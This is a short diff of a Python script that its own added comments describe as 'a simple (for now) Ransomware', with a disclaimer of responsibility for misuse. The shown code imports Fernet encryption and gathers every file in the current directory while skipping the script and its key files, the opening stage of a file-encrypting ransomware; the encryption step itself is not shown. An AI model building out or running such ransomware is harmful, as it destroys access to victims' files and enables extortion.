@@ -2,9 +2,12 @@ import os
 
 from cryptography.fernet import Fernet
 
+# Mocha is a simple (for now) Ransomware.
+# IMPROPER USE OF THIS CODE IS NOT MY RESPONSABILITY!
+
 files = []
 
-# cwd stands for Current Working Directory // .listdir()
+# cwd stands for Current Working Directory
 for file in os.listdir():
     if file == "mocha.py" or file == "choco.mocha" or file == "cappuccino.py":
         continue
